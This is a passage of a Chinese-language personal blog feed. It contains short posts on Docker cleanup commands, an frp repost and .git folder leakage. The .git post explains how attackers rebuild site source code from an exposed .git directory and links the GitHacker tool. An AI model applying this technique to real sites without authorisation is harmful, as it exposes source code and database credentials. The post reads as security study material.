&lt;p&gt;转载：https://juejin.cn/post/6854573210306871304#heading-4&lt;/p&gt;</content><author><name>Zhuang Ma</name></author><category term="frp" /><summary type="html">为什么需要内网穿透？</summary></entry><entry><title type="html">docker command</title><link href="https://dzxindex.github.io/2021/11/23/docker-command/" rel="alternate" type="text/html" title="docker command" /><published>2021-11-23T00:00:00+08:00</published><updated>2021-11-23T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/11/23/docker-command</id><content type="html" xml:base="https://dzxindex.github.io/2021/11/23/docker-command/">&lt;h1 id=&quot;delete&quot;&gt;delete&lt;/h1&gt;

&lt;div class=&quot;language-shell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
&lt;span class=&quot;c&quot;&gt;# 删除全部镜像&lt;/span&gt;
docker rmi &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;docker images &lt;span class=&quot;nt&quot;&gt;-q&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;c&quot;&gt;# 停止所有容器&lt;/span&gt;
docker stop &lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;docker ps &lt;span class=&quot;nt&quot;&gt;-aq&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Zhuang Ma</name></author><category term="docker" /><summary type="html">delete</summary></entry><entry><title type="html">nodejson格式的请求</title><link href="https://dzxindex.github.io/2021/11/22/elk-ndoejson/" rel="alternate" type="text/html" title="nodejson格式的请求" /><published>2021-11-22T00:00:00+08:00</published><updated>2021-11-22T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/11/22/elk-ndoejson</id><content type="html" xml:base="https://dzxindex.github.io/2021/11/22/elk-ndoejson/">&lt;h2 id=&quot;nodejson格式&quot;&gt;nodejson格式&lt;/h2&gt;</content><author><name>Zhuang Ma</name></author><category term="ELK" /><summary type="html">nodejson格式</summary></entry><entry><title type="html">Git泄漏漏洞与危害</title><link href="https://dzxindex.github.io/2021/11/22/git-security/" rel="alternate" type="text/html" title="Git泄漏漏洞与危害" /><published>2021-11-22T00:00:00+08:00</published><updated>2021-11-22T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/11/22/git-security</id><content type="html" xml:base="https://dzxindex.github.io/2021/11/22/git-security/">&lt;h1 id=&quot;git-泄漏漏洞与危害&quot;&gt;“.git” 泄漏漏洞与危害&lt;/h1&gt;
&lt;p&gt;当前开发人员使用Git进行软件版本控制时，对站点自动部署。如果配置不当的情况下，可能会将“.git”文件夹直接部署到线上环境。这样就引起了“.git”泄露漏洞。
攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。&lt;/p&gt;

&lt;h1 id=&quot;git目录&quot;&gt;.git目录&lt;/h1&gt;

&lt;ul&gt;
  &lt;li&gt;config - 包含一些配置选项&lt;/li&gt;
  &lt;li&gt;description - 仓库的描述信息，主要给gitweb等git托管系统使用&lt;/li&gt;
  &lt;li&gt;HEAD - 指定当前分支,映射到ref引用，能够找到下一次commit的前一次哈希值&lt;/li&gt;
  &lt;li&gt;hooks - 存放可在某些指令前后触发运行的钩子脚本（hook scripts），默认包含一些脚本样例&lt;/li&gt;
  &lt;li&gt;index - 这个文件就是我们前面提到的暂存区（stage），是一个二进制文件&lt;/li&gt;
  &lt;li&gt;info - 存放仓库的信息&lt;/li&gt;
  &lt;li&gt;objects - 存储所有Git的数据对象,对象的SHA1哈希值的前两位是文件夹名称，后38位作为对象文件名&lt;/li&gt;
  &lt;li&gt;refs - 存储各个分支指向的目标提交&lt;/li&gt;
  &lt;li&gt;branches - 还没发现有什么用处&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;git信息泄露原理&quot;&gt;Git信息泄露原理&lt;/h1&gt;
&lt;ol&gt;
  &lt;li&gt;通过泄露的.git文件夹下的文件，还原重建工程源代码&lt;/li&gt;
  &lt;li&gt;解析.git/index文件，找到工程中所有的（文件名，文件sha1）去.git/objects文件夹下下载对应的文件&lt;/li&gt;
  &lt;li&gt;zlib解压文件，按原始的目录结构写入源代码
    &lt;blockquote&gt;
      &lt;p&gt;(危害：渗透测试人员、攻击者，可以进一步代码审计，挖掘：文件上传，sql注入等安全漏洞）&lt;/p&gt;
    &lt;/blockquote&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;h1 id=&quot;githack的使用方法&quot;&gt;GitHack的使用方法&lt;/h1&gt;

&lt;p&gt;GitHack是一个.git泄露利用测试脚本，通过泄露的文件，还原重建工程源代码&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://github.com/WangYihang/GitHacker&quot;&gt;GitHack工具&lt;/a&gt;&lt;/p&gt;</content><author><name>Zhuang Ma</name></author><category term="Git" /><summary type="html">“.git” 泄漏漏洞与危害 当前开发人员使用Git进行软件版本控制时，对站点自动部署。如果配置不当的情况下，可能会将“.git”文件夹直接部署到线上环境。这样就引起了“.git”泄露漏洞。 攻击者可以利用该漏洞下载git文件夹里的所有内容。如果文件夹内有敏感信息比如站点源码、数据库账户密码等，攻击者可能直接控制服务器。</summary></entry><entry><title type="html">My page</title><link href="https://dzxindex.github.io/2021/11/22/myFirst/" rel="alternate" type="text/html" title="My page" /><published>2021-11-22T00:00:00+08:00</published><updated>2021-11-22T00:00:00+08:00</updated><id>https://dzxindex.github.io/2021/11/22/myFirst</id><content type="html" xml:base="https://dzxindex.github.io/2021/11/22/myFirst/">&lt;h1 id=&quot;安全学习&quot;&gt;安全学习&lt;/h1&gt;</content><author><name>Zhuang Ma</name></author><category term="安全" /><category term="git" /><summary type="html">安全学习</summary></entry></feed>